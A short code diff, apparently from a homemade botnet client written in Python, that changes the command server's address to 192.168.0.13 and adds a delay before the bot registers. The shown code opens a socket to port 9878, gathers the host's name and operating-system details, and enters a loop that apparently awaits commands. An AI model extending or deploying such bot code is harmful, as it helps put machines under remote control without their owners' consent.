@@ -178,7 +178,7 @@ def main():
 
   data_command = str('')
 
-  server_ip = str('192.168.0.3')
+  server_ip = str('192.168.0.13')
   server_port = int(9878)
 
   sys_information = platform.uname()
@@ -192,6 +192,7 @@ def main():
   bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   bot_socket.connect((server_ip, server_port))
 
+  time.sleep(3)
   connection_loop = Bot_register(bot_socket, pc_name, operation_system, operation_system_version)
 
   while(connection_loop):
